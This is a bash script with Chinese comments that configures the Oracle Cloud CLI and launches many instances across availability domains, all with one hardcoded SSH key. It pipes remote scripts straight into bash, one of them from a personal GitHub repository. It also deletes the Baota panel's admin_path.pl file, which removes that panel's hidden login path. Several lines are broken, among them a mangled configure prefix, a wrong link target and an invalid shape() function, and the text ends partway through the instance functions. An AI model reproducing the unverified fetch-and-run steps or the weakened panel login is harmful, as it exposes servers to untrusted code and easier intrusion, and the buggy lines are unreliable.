# 字体颜色配置
Green="\033[32m"
Red="\033[31m"
Yellow="\033[33m"
Blue="\033[36m"
Font="\033[0m"
GreenBG="\033[42;37m"
RedBG="\033[41;37m"
OK="${Green}[OK]${Font}"
ERROR="${Red}[ERROR]${Font}"



function install_oci() {
    pre_pare
    bash -c "$(curl -L https://raw.githubusercontent.com/voyku/config/main/py.sh)"
	bash -c "$(curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh)" 
	oci_config
}

function oci_config() {
  cd /root && rm -rf .oci && mkdir .oci && chmod 700 .oci && cd .oci && wget -O config https://raw.githubusercontent.com/voyku/config/main/config && chmod 600 config
  config="/root/.oci/config"
  read -rp "请输入你的秘钥名(名称不含.pem，默认路径/home/smithao/xxx.pem):" keya
  road="/home/smithao/"
  last=".pem"
  keyb=$road$keya$last
  mv ${keyb} /root/.oci/
  keynamea=${keyb##*/}
  echo -e "—————————————— ${keynamea} ——————————————"""
  chmod 600 /root/.oci/${keynamea}
  sed -i "s/kkkk/${keynamea}/g" ${config}
  echo -e "—————————————— 秘钥已设置 ——————————————""" 
  read -rp "请输入你的userid:" userid
  sed -i "s/uuuu/${userid}/g" ${config}
  echo -e "—————————————— userid已设置 ——————————————"""
  read -rp "请输入你的tenancyid:" tenancyid
  sed -i "s/tttt/${tenancyid}/g" ${config}
  echo -e "—————————————— tenancyid已设置 ——————————————"""
  while :; do
                echo -e "请输入你的region: [1-${#transport[*]}]"
                for ((i = 1; i <= ${#transport[*]}; i++)); do
                        Stream="${transport[$i - 1]}"
                                echo -e " $i.${Stream}"
                done
                read -p "$(echo -e "(输入数字)"):" v2ray_transport
                [ -z "$v2ray_transport" ] && v2ray_transport=1
                case $v2ray_transport in
                [1-4] ) 
				echo -e "区域为 = ${transport[$v2ray_transport - 1]}"
                        Regionsd="${transport[$v2ray_transport - 1]}"
						sed -i "s/gggg/${Regionsd}/g" ${config}
  echo -e "—————————————— region已设置 ——————————————"""
                        break
                        ;;
                *)
                        error
                        ;;
                esac
        done
		
  oci setup oci-cli-rc
  rm -rf oci-cli-rc && wget -O oci_cli_rc https://raw.githubusercontent.com/voyku/config/main/oci_cli_rc
  oci_cli_rc="/root/.oci/oci_cli_rc"
  sed -i "s/xxx/${tenancyid}/g" ${oci_cli_rc}
  echo -e "—————————————— oci_cli_rc已设置 ——————————————"""
  yum install -y openssl
  openssl rsa -pubout -outform DER -in ~/.oci/${keynamea} | openssl md5 -c > opssl
  fingerprinta=$(cat /root/.oci/opssl)
  fingerprint=${fingerprinta#*=}
  sed -i "s/ffff/${fingerprint}/g" ${config}
  echo -e "—————————————— 秘钥指纹已设置，配置完成，可以使用 ——————————————"""
}

transport=(
   us-ashburn-1 
   us-phoenix-1
   eu-frankfurt-1
   uk-london-1 
)

function install_baota() {
  cd / && mkdir data && chmod 700 data 
  read -rp "请输入你的秘钥地址(例如/data/keyname):" keyname
  mv ${keyname} /data/
  keynameb=${keyname##*/}
  chmod 600 /data/${keynameb}
  echo -e "—————————————— 私钥已设置 ——————————————"""
  yum install -y wget && wget -O install.sh http://download.bt.cn/install/install_6.0.sh && sh install.sh
  rm -f /www/server/panel/data/admin_path.pl
}


function install_python() {
  yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel 
  wget https://www.python.org/ftp/python/3.7.2/Python-3.7.2.tgz
  tar -zxf Python-3.7.2.tgz
  mkdir -p /usr/local/python3
  cd Python-3.7.2/ && ./configure --prefix=/usr/local/python3make && make install
  ln -s /usr/local/python3/bin/python3 /usr/bin/python3ln && ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3
  python3 --version 
}

function availability_domain() {
  oci iam availability-domain list > /root/oracle/domain
  DOMAINA=$(cat /root/oracle/domain | jq .data[0].name | tr -d '"' )
  DOMAINB=$(cat /root/oracle/domain | jq .data[1].name | tr -d '"')
  DOMAINC=$(cat /root/oracle/domain | jq .data[2].name | tr -d '"')
  print_ok "—————————————— 获取availability-domain—————————————— "
  echo -e $DOMAINA
  echo -e $DOMAINB
  echo -e $DOMAINC
  
}
function print_ok() {
  echo -e "${OK} ${Blue} $1 ${Font}"
}

function subnet() {
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vnca > /root/oracle/network/vnca
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vncb > /root/oracle/network/vncb
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vncc > /root/oracle/network/vncc
  print_ok "—————————————— 获取vnc-id—————————————— "
  VNCAID=$(cat /root/oracle/network/vnca | jq .data.id | tr -d '"')
  VNCBID=$(cat /root/oracle/network/vncb | jq .data.id | tr -d '"')
  VNCCID=$(cat /root/oracle/network/vncc | jq .data.id | tr -d '"')
  echo -e $VNCAID
  echo -e $VNCBID
  echo -e $VNCCID
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCAID} --display-name subneta --availability-domain ${DOMAINA} > /root/oracle/network/subneta
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCBID} --display-name subnetb --availability-domain ${DOMAINB} > /root/oracle/network/subnetb
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCCID} --display-name subnetc --availability-domain ${DOMAINC} > /root/oracle/network/subnetc
  oci network subnet list > /root/oracle/network/subnet
  SUBNETIDA=$(cat /root/oracle/network/subnet | jq .data[2].id | tr -d '"')
  SUBNETIDB=$(cat /root/oracle/network/subnet | jq .data[1].id | tr -d '"')
  SUBNETIDC=$(cat /root/oracle/network/subnet | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 获取subnet-id—————————————— "
  echo -e $SUBNETIDA
  echo -e $SUBNETIDB
  echo -e $SUBNETIDC
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCAID} > /root/oracle/network/gatewaya
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCBID} > /root/oracle/network/gatewayb
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCCID} > /root/oracle/network/gatewayc
  oci network route-table list > /root/oracle/network/gateway
  RTAID=$(cat /root/oracle/network/gateway | jq .data[2].id | tr -d '"')
  RTBID=$(cat /root/oracle/network/gateway | jq .data[1].id | tr -d '"')
  RTCID=$(cat /root/oracle/network/gateway | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 获取rt-id—————————————— "
  echo -e $RTAID
  echo -e $RTBID
  echo -e $RTCID
  GATEWAYAID=$(cat /root/oracle/network/gatewaya | jq .data.id | tr -d '"')
  GATEWAYBID=$(cat /root/oracle/network/gatewayb | jq .data.id | tr -d '"')
  GATEWAYCID=$(cat /root/oracle/network/gatewayc | jq .data.id | tr -d '"')
  print_ok "—————————————— 获取internetgateway-id—————————————— "
  echo -e $GATEWAYAID
  echo -e $GATEWAYBID
  echo -e $GATEWAYCID
  routea_rules="/root/oracle/routea_rules.json"
  routeb_rules="/root/oracle/routeb_rules.json"
  routec_rules="/root/oracle/routec_rules.json"
  print_ok "—————————————— 路由表规则下载...—————————————— "
  cd /root/oracle/ && wget -N --no-check-certificate -q -O routea_rules.json https://raw.githubusercontent.com/voyku/config/main/route-rules.json
  cp routea_rules.json routeb_rules.json && cp routea_rules.json routec_rules.json
  sed -i "s/xxx/${GATEWAYAID}/g" ${routea_rules}
  sed -i "s/xxx/${GATEWAYBID}/g" ${routeb_rules}
  sed -i "s/xxx/${GATEWAYCID}/g" ${routec_rules}
  print_ok "—————————————— 下载完成，开始更新路由表规则—————————————— "
  printf y  | oci network route-table update --rt-id ${RTAID} --route-rules file:///root/oracle/routea_rules.json 
  printf y  | oci network route-table update --rt-id ${RTBID} --route-rules file:///root/oracle/routeb_rules.json 
  printf y  |oci network route-table update --rt-id ${RTCID} --route-rules file:///root/oracle/routec_rules.json 
  print_ok "—————————————— 路由表规则更新完成...—————————————— "
  
  security_list
}

function shape() {
  
  VM.Standard.E3.Flex
  VM.Standard.E4.Flex 
  VM.Standard3.Flex
  VM.Standard2.2
  VM.Standard1.2
  VM.Standard1.4
  VM.Standard.E2.2
  VM.Standard.E2.4
  
  VM.Standard.E2.1.Micro
  VM.Standard.A1.Flex
}

function imageid() {
  print_ok "—————————————— 获取imageid—————————————— "
  oci compute image list --shape VM.Standard.E3.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee3
  oci compute image list --shape VM.Standard.E4.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee4
  oci compute image list --shape VM.Standard3.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/image3f
  oci compute image list --shape VM.Standard2.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image22
  oci compute image list --shape VM.Standard1.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image12
  oci compute image list --shape VM.Standard1.4 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image14
  oci compute image list --shape VM.Standard.E2.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee22
  oci compute image list --shape VM.Standard.E2.4 --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee24
  
  IMAGEE3=$(cat /root/oracle/image/imagee3 | jq .data[0].id | tr -d '"')
  IMAGEE4=$(cat /root/oracle/image/imagee4 | jq .data[0].id | tr -d '"')
  IMAGE3F=$(cat /root/oracle/image/image3f | jq .data[0].id | tr -d '"' )
  IMAGE22=$(cat /root/oracle/image/image22 | jq .data[0].id | tr -d '"')
  IMAGE12=$(cat /root/oracle/image/image12 | jq .data[0].id | tr -d '"')
  IMAGE14=$(cat /root/oracle/image/image14 | jq .data[0].id | tr -d '"')
  IMAGEE22=$(cat /root/oracle/image/imagee22 | jq .data[0].id | tr -d '"')
  IMAGEE24=$(cat /root/oracle/image/imagee24 | jq .data[0].id | tr -d '"')
 
  echo -e $IMAGEE3
  echo -e $IMAGEE4
  echo -e $IMAGE3F
  echo -e $IMAGE22
  echo -e $IMAGE12
  echo -e $IMAGE14
  echo -e $IMAGEE22
  echo -e $IMAGEE24
  
}

function open_instance() {
  print_ok "—————————————— 开始建立实例—————————————— "
  time=$(TZ=UTC-8 date "+%Y%m%d-%H%M")
  print_ok "—————————————— 当前时间${time}—————————————— "
  oci iam tenancy get > /root/oracle/user.txt
  name=$(cat /root/oracle/user.txt | jq .data.name | tr -d '"')
  print_ok "—————————————— 租户名${name}—————————————— "
  amda_e3
  amda_e4
  amdb_e3
  amdb_e4
  amdc_e3
  amdc_e4
  intela_22
  intela_3f
  intelb_22
  intelb_3f
  intelc_22
  intelc_3f
  microa_14
  microa_12
  microa_e24
  microa_e22
  microb_14
  microb_12
  microb_e24
  microb_e22
  microc_14
  microc_12
  microc_e24
  microc_e22
  print_ok "—————————————— 实例创建结束，等一分钟后再获取ip—————————————— "
}

function amda_e3() {
  print_ok " 第1台amda_e3 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amda_e3
}

function amda_e4() {
  print_ok " 第2台amda_e4 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amda_e4
}

function amdb_e3() {
  print_ok " 第3台amdb_e3 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdb_e3
}

function amdb_e4() {
  print_ok " 第4台amdb_e4 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdb_e4
}

function amdc_e3() {
  print_ok " 第5台amdc_e3 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdc_e3
}

function amdc_e4() {
  print_ok " 第6台amdc_e4 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdc_e4
}



function intela_22() {
  print_ok " 第7台intela_22 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDA}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intela_22
} 
function intela_3f() {
  print_ok " 第8台intela_3f "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDA}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intela_3f
}
function intelb_22() {
  print_ok " 第9台intelb_22 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDB}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelb_22
}
function intelb_3f() {
  print_ok " 第10台intelb_3f "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDB}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelb_3f
}
function intelc_22() {
  print_ok " 第11台intelc_22 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDC}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelc_22
}
function intelc_3f() {
  print_ok " 第12台intelc_3f "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDC}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}'> /root/oracle/ip/intelc_3f
}



function microa_14() {
  print_ok " 第13台microa_14 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDA}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_14
}
function microa_12() {
  print_ok " 第14台microa_12 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDA}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_12
}
function microa_e24() {
  print_ok " 第15台microa_e24 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_e24
}
function microa_e22() {
  print_ok " 第16台microa_e22 "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${email} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_e22
}


function microb_14() {
  print_ok " 第17台microb_14 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDB}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_14
}
function microb_12() {
  print_ok " 第18台microb_12 "
